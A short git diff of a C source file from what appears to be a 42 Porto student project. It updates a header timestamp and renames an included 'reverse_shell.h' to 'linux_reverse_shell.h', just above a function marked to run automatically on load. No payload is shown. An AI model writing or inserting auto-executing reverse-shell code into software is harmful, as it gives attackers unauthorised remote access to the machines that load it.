@@ -6,7 +6,7 @@
 /*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/10 17:29:38 by joesanto          #+#    #+#             */
-/*   Updated: 2026/01/10 19:44:49 by joesanto         ###   ########.fr       */
+/*   Updated: 2026/01/11 00:54:30 by joesanto         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,7 +15,7 @@
 
 # include <unistd.h>
 # include <stdlib.h>
-# include "reverse_shell.h"
+# include "linux_reverse_shell.h"
 
  __attribute__((constructor))
  static inline
